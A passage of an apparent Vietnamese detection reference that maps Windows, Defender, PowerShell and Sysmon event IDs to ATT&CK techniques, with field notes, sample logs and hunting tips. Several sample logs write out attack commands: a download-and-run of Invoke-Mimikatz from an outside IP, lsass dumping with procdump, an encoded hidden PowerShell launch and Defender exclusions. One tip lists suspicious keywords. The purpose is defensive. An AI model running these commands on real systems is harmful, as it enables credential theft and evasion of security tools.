 "Yêu cầu mở handle (kể cả bị từ chối). Với SACL trên lsass có thể bắt hành vi đọc bộ nhớ lsass.","SubjectUserName: Tài khoản yêu cầu mở handle\nObjectType: Loại object (File, Process, Key...)\nObjectName: Đường dẫn/định danh object được truy cập\nProcessName: Tiến trình thực hiện yêu cầu\nAccessMask: Quyền truy cập được yêu cầu (dạng hex, cần map sang quyền cụ thể)", R`EventID=4656 SubjectUserName=thanhnv ObjectType=Process ObjectName=\Device\HarddiskVolume3\Windows\System32\lsass.exe ProcessName=C:\Users\Public\pd.exe AccessMask=0x1410`, "Tiến trình lạ mở handle tới lsass.exe với quyền đọc bộ nhớ.", ""],


["win-sec","4657","Giá trị registry bị sửa","m","T1547.001",
 "Cần SACL trên key. Phù hợp giám sát Run key, IFEO, Winlogon.","SubjectUserName: Tài khoản thực hiện sửa registry\nObjectName: Đường dẫn registry key\nObjectValueName: Tên value bị sửa\nNewValue: Giá trị mới được ghi vào\nProcessName: Tiến trình thực hiện thay đổi (vd. reg.exe)", R`EventID=4657 SubjectUserName=thanhnv ObjectName=\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run ObjectValueName=Updater NewValue=C:\Users\Public\upd.exe ProcessName=C:\Windows\System32\reg.exe`, "", ""],


["win-sec","4670","Quyền trên object thay đổi","m","T1222",
 "DACL của file/registry/object bị sửa.", "OldSd / NewSd: SDDL trước và sau", R`EventID=4670 SubjectUserName=adm_x ObjectType=File ObjectName=C:\Windows\System32\config\SAM OldSd=D:... NewSd=D:...(A;;FA;;;WD)`, "NewSd thêm quyền cho Everyone (WD) hoặc Authenticated Users (AU) trên object hệ thống.", ""],


["win-sec","4673","Gọi dịch vụ đặc quyền","i","",
 "Rất ồn; hữu ích khi lọc SeTcbPrivilege, SeDebugPrivilege trên tiến trình lạ.","SubjectUserName: Tài khoản gọi dịch vụ đặc quyền\nService: Tên dịch vụ được gọi (thường rỗng \"-\")\nPrivilegeList: Danh sách quyền đặc quyền được dùng (vd. SeDebugPrivilege, SeTcbPrivilege)\nProcessName: Tiến trình thực hiện lời gọi", R`EventID=4673 SubjectUserName=thanhnv Service=- PrivilegeList=SeTcbPrivilege ProcessName=C:\Users\Public\x.exe`, "", ""],


["win-sec","4703","Điều chỉnh quyền trong token","i","T1134",
 "Tiến trình bật/tắt quyền trong token của nó.","SubjectUserName: Tài khoản sở hữu tiến trình\nProcessName: Tiến trình điều chỉnh quyền trong token của nó\nEnabledPrivilegeList: Danh sách quyền được bật\nDisabledPrivilegeList: Danh sách quyền bị tắt", R`EventID=4703 SubjectUserName=thanhnv ProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe EnabledPrivilegeList=SeDebugPrivilege`, "powershell bật SeDebugPrivilege: thường đi trước việc đọc lsass.", ""],


["win-sec","4741/4742","Tạo / sửa tài khoản máy","m","T1136.002",
 "4741 computer account mới; 4742 thay đổi (vd. đổi tên, đổi SPN, delegation).","SubjectUserName: Tài khoản thực hiện tạo/sửa computer account\nTargetUserName: Tên computer account (kết thúc bằng $)\nTargetDomainName: Domain chứa computer account\nDnsHostName: Tên DNS được gán cho máy\nServicePrincipalNames: Danh sách SPN đăng ký cho computer account", R`EventID=4741 SubjectUserName=thanhnv TargetUserName=FAKE01$ TargetDomainName=CORP DnsHostName=- ServicePrincipalNames=-`, "User thường tạo computer account (MachineAccountQuota mặc định 10): tiền đề cho RBCD hoặc noPac (CVE-2021-42278/42287).", ""],


["win-sec","4765/4766","Thêm SID History","c","T1134.005",
 "SID History được thêm (4765) hoặc thất bại (4766). Hiếm khi hợp lệ ngoài migration domain.","SubjectUserName: Tài khoản thực hiện thêm SID History\nTargetUserName: Tài khoản nhận SID History\nTargetDomainName: Domain của tài khoản đích\nSidHistory: SID được thêm vào thuộc tính sIDHistory (có thể mạo danh quyền của SID này)", R`EventID=4765 SubjectUserName=adm_x TargetUserName=thanhnv SidHistory=S-1-5-21-...-512`, "SID History chứa RID 512/519 (Domain/Enterprise Admins).", ""],


["win-sec","4780","Đặt ACL cho tài khoản thuộc nhóm admin","m","T1098",
 "SDProp áp lại ACL từ AdminSDHolder (chạy mỗi 60 phút).","SubjectUserName: Tài khoản/máy thực hiện (thường là DC$ chạy SDProp)\nTargetUserName: Tài khoản được áp lại ACL từ AdminSDHolder\nTargetDomainName: Domain của tài khoản\nTargetSid: SID của tài khoản", R`EventID=4780 SubjectUserName=DC01$ TargetUserName=adm_thanh TargetDomainName=CORP`, "Kết hợp 5136 trên CN=AdminSDHolder để bắt việc cài backdoor ACL.", ""],


["win-sec","4706/4707","Tạo / xóa domain trust","h","T1484.002",
 "Trust mới tới domain khác.","SubjectUserName: Tài khoản tạo/xóa trust\nDomainName: Tên domain đối tác trong quan hệ trust\nTrustType: Loại trust (1=Windows NT, 2=Active Directory...)\nTrustDirection: Chiều của trust (1=inbound, 2=outbound, 3=bidirectional)", R`EventID=4706 SubjectUserName=adm_x DomainName=partner.local TrustType=2 TrustDirection=3`, "", ""],


["win-sec","4739","Thay đổi chính sách domain","m","T1484",
 "Password policy, lockout policy của domain thay đổi.","SubjectUserName: Tài khoản thực hiện thay đổi policy\nDomainName: Domain bị thay đổi chính sách\nMinPasswordLength: Độ dài mật khẩu tối thiểu mới\nLockoutThreshold: Số lần đăng nhập sai tối đa trước khi khóa tài khoản", R`EventID=4739 SubjectUserName=adm_x DomainName=CORP MinPasswordLength=4 LockoutThreshold=0`, "LockoutThreshold về 0 hoặc giảm độ dài mật khẩu.", ""],


["win-sec","4964","Đăng nhập của nhóm đặc biệt","m","T1078",
 "Ghi khi tài khoản thuộc nhóm được cấu hình trong Special Groups (registry SpecialGroups) đăng nhập.","TargetUserName: Tài khoản đăng nhập thuộc nhóm đặc biệt\nLogonId: ID phiên đăng nhập (khớp với 4624 tương ứng)\nSidList: Danh sách SID của các nhóm đặc biệt mà tài khoản thuộc về", R`EventID=4964 LogonId=0x5A21F0 TargetUserName=adm_thanh SidList={S-1-5-21-...-512}`, "Cấu hình Special Groups = Domain Admins để có một log riêng cho mọi đăng nhập của DA.", ""],


["win-sec","5136","Object AD bị sửa","h","T1484.001",
 "Thuộc tính object AD thay đổi (cần bật Audit Directory Service Changes và SACL).",
 R`ObjectDN: object bị sửa
AttributeLDAPDisplayName: thuộc tính
OperationType: Value Added / Value Deleted`,
 R`EventID=5136 SubjectUserName=adm_x ObjectDN=CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local AttributeLDAPDisplayName=gPCMachineExtensionNames OperationType=Value Added`,
 "Sửa GPO, AdminSDHolder, msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), servicePrincipalName (targeted Kerberoast), msDS-KeyCredentialLink (Shadow Credentials).", ""],


["win-sec","5137","Object AD được tạo","m","",
 "Object mới trong AD (OU, GPO, user, computer...).","SubjectUserName: Tài khoản tạo object\nObjectDN: Distinguished Name đầy đủ của object mới\nObjectGUID: GUID duy nhất của object trong AD\nObjectClass: Loại object (user, computer, groupPolicyContainer, organizationalUnit...)", R`EventID=5137 SubjectUserName=adm_x ObjectDN=CN={8A1B...},CN=Policies,CN=System,DC=corp,DC=local ObjectClass=groupPolicyContainer`, "", ""],


["win-sec","5140","Truy cập network share","m","T1021.002",
 "Share được truy cập (ghi một lần mỗi phiên).", "ShareName: chú ý C$, ADMIN$, IPC$", R`EventID=5140 SubjectUserName=adm_thanh IpAddress=10.20.5.23 ShareName=\\*\ADMIN$ ShareLocalPath=\??\C:\Windows`, "Truy cập ADMIN$/C$ từ máy trạm tới máy trạm khác: lateral movement.", ""],


["win-sec","5145","Kiểm tra truy cập file trong share","m","T1021.002",
 "Chi tiết từng file/pipe truy cập qua share. Rất ồn, nhưng hữu ích với IPC$.", "RelativeTargetName: file hoặc named pipe", R`EventID=5145 SubjectUserName=adm_thanh IpAddress=10.20.5.23 ShareName=\\*\IPC$ RelativeTargetName=svcctl AccessMask=0x3`, "IPC$ với pipe svcctl (tạo service từ xa), atsvc (task từ xa), samr/lsarpc (trinh sát); ADMIN$ với file .exe mới.", ""],


["win-sec","5142","Tạo network share","m","T1021.002",
 "Share mới được thêm.","SubjectUserName: Tài khoản tạo share\nShareName: Tên share (UNC), vd. \\\\*\\data$\nShareLocalPath: Đường dẫn vật lý trên máy local được chia sẻ", R`EventID=5142 SubjectUserName=adm_x ShareName=\\*\data$ ShareLocalPath=C:\Users\Public`, "", ""],


["win-sec","5156/5157","Windows Filtering Platform: cho phép / chặn kết nối","i","T1071",
 "5156 kết nối được phép, 5157 bị chặn. Rất ồn; thường chỉ bật khi điều tra.", "Direction, SourceAddress, DestAddress, DestPort, Application", R`EventID=5156 Application=\device\harddiskvolume3\users\public\upd.exe Direction=%%14593 SourceAddress=10.20.5.23 DestAddress=203.0.113.7 DestPort=443 Protocol=6`, "", ""],


["win-sec","4946/4947/4948","Thêm / sửa / xóa rule Windows Firewall","m","T1562.004",
 "Rule firewall thay đổi (ghi trong Security). Kênh Firewall riêng xem mục Khác.","SubjectUserName: Tài khoản thực hiện thay đổi rule\nProfileChanged: Profile firewall bị ảnh hưởng (Domain/Private/Public)\nRuleId: ID định danh của rule\nRuleName: Tên/mô tả rule bị thêm/sửa/xóa", R`EventID=4946 ProfileChanged=Domain RuleName=Allow 4444 RuleId={...}`, "", ""],


["win-sec","1102","Xóa Security log","c","T1070.001",
 "Audit log Security bị xóa (wevtutil cl, Clear-EventLog, Event Viewer).","SubjectUserName: Tài khoản thực hiện xóa log\nSubjectDomainName: Domain của tài khoản\nSubjectLogonId: ID phiên đăng nhập (dùng để lần ra phiên đăng nhập đã xóa log)", R`EventID=1102 Provider=Microsoft-Windows-Eventlog SubjectUserName=adm_x SubjectDomainName=CORP SubjectLogonId=0x5A21F0`, "Luôn cảnh báo. Đồng thời kiểm tra 104 (System) và khoảng trống thời gian trong log đã thu thập.", ""],


["win-sec","4616","Thay đổi thời gian hệ thống","m","",
 "Giờ hệ thống bị đổi. Lọc bỏ thay đổi nhỏ của dịch vụ đồng bộ thời gian.","SubjectUserName: Tài khoản thực hiện đổi giờ\nPreviousTime: Giờ hệ thống trước khi đổi\nNewTime: Giờ hệ thống sau khi đổi\nProcessName: Tiến trình thực hiện thay đổi (vd. cmd.exe, w32tm.exe)", R`EventID=4616 SubjectUserName=thanhnv PreviousTime=2026-10-24T02:10:00Z NewTime=2025-01-01T00:00:00Z ProcessName=C:\Windows\System32\cmd.exe`, "", ""],


["win-sec","4608/4609","Windows khởi động / tắt","i","",
 "4608 Windows starting up; 4609 shutting down.","TimeCreated: Sự kiện không có EventData riêng; dùng thời điểm ghi log làm mốc Windows bắt đầu khởi động (4608) hoặc bắt đầu tắt máy (4609)", R`EventID=4608`, "", ""],


["win-sec","4800/4801","Khóa / mở khóa máy trạm","i","",
 "Dùng để xác định người có mặt trước máy.","TargetUserName: Tài khoản của phiên bị khóa/mở khóa\nTargetDomainName: Domain của tài khoản\nTargetLogonId: ID phiên đăng nhập liên quan\nSessionId: ID phiên Terminal Services/console tương ứng", R`EventID=4801 TargetUserName=thanhnv TargetDomainName=CORP SessionId=2`, "", ""],


["win-sec","4825","Từ chối truy cập Remote Desktop","m","T1021.001",
 "User không thuộc nhóm Remote Desktop Users cố RDP.","AccountName: Tài khoản cố gắng RDP\nAccountDomain: Domain của tài khoản\nClientAddress: Địa chỉ IP nguồn kết nối RDP", R`EventID=4825 AccountName=thanhnv AccountDomain=CORP ClientAddress=10.20.5.23`, "", ""],


["win-sec","6416","Thiết bị ngoài mới được nhận","m","T1200",
 "Thiết bị PnP mới (USB, điện thoại). Cần bật Audit PNP Activity.","SubjectUserName: Tài khoản/máy ghi nhận thiết bị (thường là computer account)\nDeviceDescription: Mô tả thiết bị (vd. Mass Storage Device)\nClassName: Lớp thiết bị (USB, DiskDrive...)\nDeviceId: Định danh phần cứng (VID/PID) để nhận diện model thiết bị", R`EventID=6416 SubjectUserName=WS-IT-021$ DeviceDescription=Mass Storage Device ClassName=USB DeviceId=USB\VID_0781&PID_5583\4C530001...`, "", ""],


["win-sec","5379","Đọc credential trong Credential Manager","m","T1555.004",
 "Credential Manager bị đọc. Ồn với ứng dụng hợp lệ.","SubjectUserName: Tài khoản thực hiện đọc credential\nTargetName: Tên credential được truy vấn (vd. đích RDP/SMB đã lưu)\nType: Loại credential (1=Generic, 2=Domain Password...)\nCountOfCredentialsReturned: Số lượng credential trả về", R`EventID=5379 SubjectUserName=thanhnv TargetName=Domain:target=TERMSRV/SRV-DB01 Type=2 CountOfCredentialsReturned=1`, "Tiến trình lạ đọc nhiều credential trong thời gian ngắn.", ""],



/* ===== Windows System ===== */
["win-sys","7045","Service mới được cài (System)","h","T1543.003",
 "Luôn có trong System, không cần bật audit. Nguồn tốt nhất để bắt PsExec, Impacket, Cobalt Strike tạo service.",
 R`ServiceName, ImagePath (Service File Name), ServiceType, StartType, AccountName`,
 R`EventID=7045 Provider=Service Control Manager ServiceName=BTOBTO ImagePath=%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat ServiceType=user mode service StartType=demand start AccountName=LocalSystem`,
 "ImagePath chứa cmd /c, powershell -enc, \\\\127.0.0.1\\ADMIN$, đường dẫn Temp/ProgramData/Public; tên service ngẫu nhiên 4-8 ký tự (smbexec, Cobalt Strike psexec); driver mới (kernel mode) chưa ký.", ""],


["win-sys","7040","Thay đổi kiểu khởi động service","m","T1562.001",
 "Service đổi start type (auto/manual/disabled).","param1: Tên hiển thị của service bị đổi\nparam2: Kiểu khởi động trước đó (auto/manual/disabled)\nparam3: Kiểu khởi động mới", R`EventID=7040 Provider=Service Control Manager param1=Windows Defender Antivirus Service param2=auto start param3=disabled`, "Service bảo mật, backup, VSS bị đặt disabled.", ""],


["win-sys","7036","Service đổi trạng thái","i","",
 "Service chuyển sang running/stopped. Ồn, nhưng giúp dựng timeline.","param1: Tên service đổi trạng thái\nparam2: Trạng thái mới (running/stopped...)", R`EventID=7036 param1=Volume Shadow Copy param2=stopped`, "Hàng loạt service SQL, Exchange, backup bị dừng gần nhau: tiền mã hóa.", ""],


["win-sys","7034","Service dừng bất thường","m","",
 "Service crash. Có thể do exploit hoặc bị kill.","param1: Tên service bị crash\nparam2: Số lần service này đã crash (bộ đếm)", R`EventID=7034 param1=SentinelOne Agent param2=1`, "Agent EDR/AV crash lặp lại.", ""],


["win-sys","104","Xóa một event log","c","T1070.001",
 "Một log (System, Application, kênh bất kỳ) bị xóa. Security bị xóa thì xem 1102.","SubjectUserName: Tài khoản thực hiện xóa log\nChannel: Tên log/kênh bị xóa (System, Application...)\nBackupPath: Đường dẫn file backup trước khi xóa (thường rỗng)", R`EventID=104 Provider=Microsoft-Windows-Eventlog SubjectUserName=adm_x Channel=System`, "Luôn cảnh báo.", ""],


["win-sys","6005/6006","Event Log service bắt đầu / dừng","i","",
 "Xấp xỉ thời điểm boot (6005) và tắt máy bình thường (6006).","TimeCreated: Sự kiện không có EventData cụ thể; thời điểm ghi log dùng làm mốc Event Log service khởi động (6005, gần đúng thời điểm boot) hoặc dừng (6006, gần đúng thời điểm shutdown bình thường)", R`EventID=6005 Provider=EventLog`, "", ""],


["win-sys","6008","Tắt máy không đúng cách","m","",
 "Lần tắt trước là bất thường (mất điện, crash, bị kill).","param1: Giờ của lần tắt máy bất thường trước đó\nparam2: Ngày của lần tắt máy bất thường trước đó", R`EventID=6008 Message=The previous system shutdown at 02:41:07 on 24/10/2026 was unexpected.`, "", ""],


["win-sys","1074","Tiến trình/user yêu cầu tắt hoặc khởi động lại","i","T1529",
 "Ai và tiến trình nào ra lệnh shutdown/restart.","param1: Tiến trình yêu cầu shutdown/restart (kèm tên máy trong ngoặc)\nparam2: Tên máy bị tắt/khởi động lại\nparam3: Nội dung lý do (reason text)\nparam4: Mã lý do dạng hex (reason code)\nparam5: Hành động được yêu cầu (restart/power off)\nparam7: Tài khoản đã thực hiện lệnh", R`EventID=1074 Provider=User32 Message=The process C:\Windows\system32\shutdown.exe (WS-IT-021) has initiated the restart of computer SRV-APP01 on behalf of user CORP\adm_x for the following reason: No title for this reason could be found`, "Restart hàng loạt server ngoài giờ bảo trì.", ""],


["win-sys","41","Kernel-Power: khởi động lại không sạch","m","",
 "Hệ thống reboot mà không tắt sạch (crash, mất điện, BSOD).","BugcheckCode: Mã bugcheck nếu có BSOD trước khi reboot (0 = không ghi nhận bugcheck)\nBugcheckParameter1: Tham số bổ sung đi kèm bugcheck\nPowerButtonTimestamp: Thời điểm nút nguồn được nhấn (0 nếu không liên quan)", R`EventID=41 Provider=Microsoft-Windows-Kernel-Power BugcheckCode=0 PowerButtonTimestamp=0`, "", ""],


["win-sys","12/13","OS khởi động / tắt (Kernel-General)","i","",
 "Mốc thời gian boot và shutdown chính xác.","StartTime: Thời điểm hệ điều hành khởi động (chỉ có ở event 12; event 13 dùng TimeCreated của chính sự kiện làm mốc tắt máy)", R`EventID=12 Provider=Microsoft-Windows-Kernel-General StartTime=2026-10-24T01:02:11.5Z`, "", ""],


["win-sys","19/20","Windows Update thành công / thất bại","i","",
 "Provider WindowsUpdateClient. Kiểm tra tình trạng vá.","updateTitle: Tên bản cập nhật\nupdateGuid: GUID định danh bản cập nhật\nupdateRevisionNumber: Số revision của bản cập nhật\nerrorCode: Mã lỗi cài đặt (chỉ có ở event 20 khi thất bại)", R`EventID=19 Provider=Microsoft-Windows-WindowsUpdateClient updateTitle=2026-10 Cumulative Update for Windows Server 2022 (KB50xxxxx)`, "", ""],



/* ===== Defender ===== */
["win-def","1116","Phát hiện malware","h","",
 "Defender phát hiện mối đe dọa.", "Threat Name, Path, Process Name, Detection User", R`EventID=1116 ThreatName=HackTool:Win64/Mimikatz!pz Severity=High Path=file:_C:\Users\Public\m.exe ProcessName=C:\Windows\explorer.exe DetectionUser=CORP\thanhnv`, "Tên HackTool:*, Behavior:*, Trojan:Win32/CobaltStrike trên server.", ""],


["win-def","1117","Đã xử lý malware","m","",
 "Hành động (quarantine, remove) thực hiện thành công.","Threat Name: Tên mối đe dọa được phát hiện\nSeverity Name: Mức độ nghiêm trọng (Severe, High, Medium...)\nPath: Đường dẫn file/tiến trình chứa mối đe dọa\nAction Name: Hành động đã thực hiện (Quarantine, Remove, Allow...)", R`EventID=1117 ThreatName=HackTool:Win64/Mimikatz!pz Action=Quarantine`, "", ""],


["win-def","1118/1119","Xử lý malware thất bại","h","",
 "Không thể quarantine/remove, mối đe dọa có thể vẫn còn.","Threat Name: Tên mối đe dọa\nPath: Vị trí không thể xử lý được\nAction Name: Hành động đã cố thực hiện (Remove, Quarantine...)\nError Code: Mã lỗi trả về\nError Description: Mô tả lỗi", R`EventID=1119 ThreatName=Trojan:Win32/Wacatac ErrorCode=0x80508023 Action=Remove`, "", ""],


["win-def","5001","Tắt Real-time protection","c","T1562.001",
 "Bảo vệ thời gian thực bị tắt.","Product Name: Tên sản phẩm bảo vệ (Microsoft Defender Antivirus)\nProduct Version: Phiên bản engine Defender tại thời điểm ghi log", R`EventID=5001 Message=Microsoft Defender Antivirus Real-time Protection scanning for malware and other potentially unwanted software was disabled.`, "", ""],


["win-def","5007","Thay đổi cấu hình Defender","h","T1562.001",
 "Cấu hình bị sửa, kể cả thêm exclusion.", "Old Value / New Value: key registry thay đổi", R`EventID=5007 OldValue= NewValue=HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public = 0x0`, "Exclusion mới cho thư mục Temp/Public/ProgramData hoặc cho extension .exe/.dll.", ""],


["win-def","5013","Tamper Protection chặn thay đổi","m","T1562.001",
 "Có kẻ cố đổi cấu hình bảo vệ nhưng bị chặn.","Value: Đường dẫn registry/setting mà kẻ tấn công cố thay đổi nhưng bị chặn\nOld Value: Giá trị cũ của setting\nNew Value: Giá trị mới mà thao tác cố ghi vào (bị chặn)", R`EventID=5013 Value=HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring`, "Dấu hiệu rõ của ý đồ tắt AV.", ""],



/* ===== PowerShell ===== */
["win-ps","4104","Script Block Logging","h","T1059.001",
 "Ghi nội dung script đã được giải mã (kể cả -EncodedCommand). Script có từ khóa đáng ngờ được ghi ở mức Warning kể cả khi chưa bật.",
 "ScriptBlockText, ScriptBlockId, MessageNumber/MessageTotal (script dài bị chia nhiều event)",
 R`EventID=4104 Level=Warning ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds ScriptBlockId=6f2b... Path=`,
 "Từ khóa: FromBase64String, IEX/Invoke-Expression, DownloadString/DownloadFile, Net.WebClient, Invoke-WebRequest tới IP, AmsiUtils/amsiInitFailed, Reflection.Assembly::Load, VirtualAlloc, -bxor, Invoke-Mimikatz, Get-GPPPassword, Add-MpPreference -ExclusionPath.", ""],


["win-ps","4103","Module Logging","m","T1059.001",
 "Ghi từng lệnh pipeline và tham số được gọi.","ContextInfo: Thông tin ngữ cảnh host (Host Application, phiên bản engine, thời điểm chạy)\nPayload: Nội dung chi tiết của lệnh, gồm CommandInvocation và ParameterBinding\nCommandInvocation: Tên cmdlet/lệnh được gọi trong pipeline\nParameterBinding: Tên và giá trị tham số được truyền cho lệnh\nHost Application: Đường dẫn tiến trình host đã chạy lệnh (vd powershell.exe ...)", R`EventID=4103 Payload=CommandInvocation(Add-MpPreference): "Add-MpPreference" ParameterBinding(Add-MpPreference): name="ExclusionPath"; value="C:\Users\Public" ContextInfo=Host Application = powershell.exe`, "", ""],


["win-ps","400","PowerShell engine khởi động (classic log)","m","T1059.001",
 "Log Windows PowerShell. HostApplication chứa toàn bộ dòng lệnh khởi chạy.", "EngineVersion=2.0: downgrade để né AMSI/Script Block Logging", R`EventID=400 NewEngineState=Available HostApplication=powershell.exe -nop -w hidden -version 2 -enc SQBFAFgA... EngineVersion=2.0`, "EngineVersion 2.0 trên máy mới; HostApplication không phải powershell.exe (PowerShell không cần powershell.exe, vd. rundll32 nạp System.Management.Automation).", ""],


["win-ps","800","Pipeline execution (classic log)","i","",
 "Chi tiết thực thi pipeline khi bật module logging.","CommandLine: Toàn bộ dòng lệnh/pipeline được thực thi\nCommandName: Tên cmdlet hoặc lệnh trong pipeline\nHostApplication: Tiến trình host chạy PowerShell (vd powershell.exe)\nEngineVersion: Phiên bản PowerShell engine\nRunspaceId / PipelineId: Định danh runspace và pipeline, dùng để liên kết các sự kiện 800 cùng một lệnh", R`EventID=800 CommandLine=Get-ADUser -Filter * -Properties ServicePrincipalName`, "", ""],



/* ===== Sysmon ===== */
["win-sysmon","1","Process Create","h","T1059",
 "Tạo tiến trình kèm hash, command line, tiến trình cha, OriginalFileName.",
 R`OriginalFileName: tên gốc trong PE, bắt binary bị đổi tên
Hashes: MD5/SHA256/IMPHASH theo cấu hình
ParentImage, ParentCommandLine
IntegrityLevel: Medium/High/System`,
 R`EventID=1 Image=C:\Users\Public\svchost.exe OriginalFileName=procdump CommandLine="C:\Users\Public\svchost.exe" -ma lsass.exe C:\Users\Public\l.dmp ParentImage=C:\Windows\System32\cmd.exe User=CORP\adm_thanh IntegrityLevel=High Hashes=SHA256=9E7B...`,
 "Image và OriginalFileName không khớp; svchost.exe chạy ngoài System32; cha là w3wp.exe/sqlservr.exe/java.exe sinh cmd/powershell (webshell, SQL xp_cmdshell).", ""],


["win-sysmon","2","Thay đổi thời gian tạo file","m","T1070.006",
 "Timestomping.","Image: Đường dẫn tiến trình thực hiện thay đổi thời gian file\nTargetFilename: File bị sửa thuộc tính thời gian tạo\nCreationUtcTime: Giá trị thời gian tạo mới được ghi đè vào\nPreviousCreationUtcTime: Giá trị thời gian tạo thật trước khi bị sửa\nProcessId / ProcessGuid: Định danh tiến trình thực hiện hành vi", R`EventID=2 Image=C:\Users\Public\x.exe TargetFilename=C:\Windows\System32\drivers\svc.sys CreationUtcTime=2019-03-19 04:00:00 PreviousCreationUtcTime=2026-10-24 02:10:44`, "", ""],


["win-sysmon","3","Network Connection","m","T1071",
 "Kết nối TCP/UDP của tiến trình.", "Image, DestinationIp, DestinationPort, Initiated", R`EventID=3 Image=C:\Windows\System32\rundll32.exe User=CORP\thanhnv Protocol=tcp Initiated=true SourceIp=10.20.5.23 DestinationIp=203.0.113.7 DestinationPort=443`, "rundll32, regsvr32, mshta, certutil, powershell kết nối ra Internet; beacon đều đặn tới cùng IP.", ""],


["win-sysmon","5","Process Terminated","i","",
 "Tiến trình kết thúc.","Image: Đường dẫn tiến trình vừa kết thúc\nProcessId / ProcessGuid: Định danh tiến trình, dùng để nối với sự kiện Process Create (ID 1) tương ứng\nUser: Tài khoản sở hữu tiến trình\nUtcTime: Thời điểm tiến trình kết thúc", R`EventID=5 Image=C:\Users\Public\x.exe ProcessId=4412`, "", ""],


["win-sysmon","6","Driver Loaded","m","T1068, T1014",
 "Driver được nạp.", "Signed, Signature, SignatureStatus", R`EventID=6 ImageLoaded=C:\Windows\Temp\RTCore64.sys Signed=true Signature=Micro-Star International CO., LTD. SignatureStatus=Valid`, "Driver có lỗ hổng đã biết (BYOVD, tham khảo loldrivers.io) nạp từ thư mục Temp; dùng để kill EDR.", ""],


["win-sysmon","7","Image Loaded (DLL)","m","T1574.002",
 "DLL được nạp. Rất ồn, cần cấu hình lọc.","Image: Tiến trình nạp DLL\nImageLoaded: Đường dẫn file DLL được nạp\nSigned / Signature / SignatureStatus: Trạng thái và thông tin chữ ký số của DLL\nHashes: Hash của file DLL (SHA256/IMPHASH...)\nOriginalFileName / Product / Company: Metadata PE gốc của DLL, hữu ích để phát hiện DLL giả mạo tên", R`EventID=7 Image=C:\ProgramData\app\OneDriveUpdater.exe ImageLoaded=C:\ProgramData\app\version.dll Signed=false`, "DLL không ký nạp bởi exe có ký nằm ngoài thư mục cài đặt chuẩn: DLL sideloading.", ""],


["win-sysmon","8","CreateRemoteThread","h","T1055",
 "Tiến trình tạo thread trong tiến trình khác: dấu hiệu process injection.","SourceImage / SourceProcessId: Tiến trình khởi tạo thread (kẻ tấn công/loader)\nTargetImage / TargetProcessId: Tiến trình bị tạo thread bên trong (nạn nhân bị inject)\nNewThreadId: ID thread mới được tạo trong tiến trình đích\nStartAddress: Địa chỉ bộ nhớ nơi thread bắt đầu thực thi\nStartModule / StartFunction: Module/hàm tương ứng với StartAddress nếu xác định được (thường rỗng khi inject shellcode)", R`EventID=8 SourceImage=C:\Users\Public\loader.exe TargetImage=C:\Windows\System32\notepad.exe StartAddress=0x0000019A3F2B0000 StartModule= StartFunction=`, "StartModule rỗng (shellcode trong vùng nhớ cấp phát động).", ""],


["win-sysmon","10","Process Access","h","T1003.001",
 "Tiến trình mở handle tới tiến trình khác. Cấu hình lọc TargetImage=lsass.exe.",
 R`GrantedAccess=0x1010 / 0x1410 / 0x1FFFFF: quyền đọc bộ nhớ thường gặp khi dump
CallTrace chứa UNKNOWN hoặc dbghelp.dll/dbgcore.dll: đáng ngờ`,
 R`EventID=10 SourceImage=C:\Windows\System32\rundll32.exe TargetImage=C:\Windows\system32\lsass.exe GrantedAccess=0x1FFFFF CallTrace=C:\Windows\SYSTEM32\ntdll.dll+9d204|C:\Windows\System32\comsvcs.dll+...|UNKNOWN(00007FF8...)`,
 "rundll32 + comsvcs.dll MiniDump, procdump -ma lsass, Mimikatz; whitelist rõ ràng các agent bảo mật hợp lệ.", ""],


["win-sysmon","11","File Create","m","T1105",
 "File được tạo/ghi đè.","Image: Tiến trình tạo hoặc ghi đè file\nTargetFilename: Đường dẫn file được tạo/ghi đè\nCreationUtcTime: Thời điểm tạo file\nProcessId / ProcessGuid: Định danh tiến trình thực hiện\nUser: Tài khoản thực hiện", R`EventID=11 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename=C:\Users\Public\upd.exe`, "File thực thi tạo bởi Office/trình duyệt/powershell trong thư mục Startup, Temp, Public; file .aspx/.jsp mới trong webroot.", ""],


["win-sysmon","12/13/14","Registry: tạo-xóa key / ghi value / đổi tên","m","T1547.001",
 "12 tạo/xóa key, 13 ghi value, 14 đổi tên key.","EventType: Loại thao tác registry (CreateKey, DeleteKey, SetValue, RenameKey)\nImage: Tiến trình thực hiện thao tác registry\nTargetObject: Đường dẫn key/value registry bị tác động\nDetails: Giá trị mới được ghi (chỉ có ở SetValue, ID 13)\nNewName: Tên mới của key (chỉ có ở RenameKey, ID 14)", R`EventID=13 EventType=SetValue Image=C:\Windows\System32\reg.exe TargetObject=HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync Details=C:\Users\Public\upd.exe`, "Run/RunOnce, Winlogon\\Shell/Userinit, IFEO\\Debugger, Services\\<name>\\ImagePath, CLSID InprocServer32 (COM hijack).", ""],


["win-sysmon","15","FileCreateStreamHash (ADS)","m","T1564.004",
 "Alternate Data Stream được tạo; Zone.Identifier cho biết file tải từ đâu.","Image: Tiến trình tạo Alternate Data Stream\nTargetFilename: File:Stream được tạo (vd file:Zone.Identifier)\nHash: Hash của nội dung stream\nContents: Nội dung stream; với Zone.Identifier chứa ZoneId và HostUrl/ReferrerUrl cho biết nguồn tải file\nUser: Tài khoản thực hiện", R`EventID=15 Image=C:\Program Files\Google\Chrome\Application\chrome.exe TargetFilename=C:\Users\thanhnv\Downloads\HoaDon.iso:Zone.Identifier Contents=[ZoneTransfer] ZoneId=3 HostUrl=https://files-share.example/x.iso`, "", ""],


["win-sysmon","17/18","Named pipe tạo / kết nối","m","T1559",
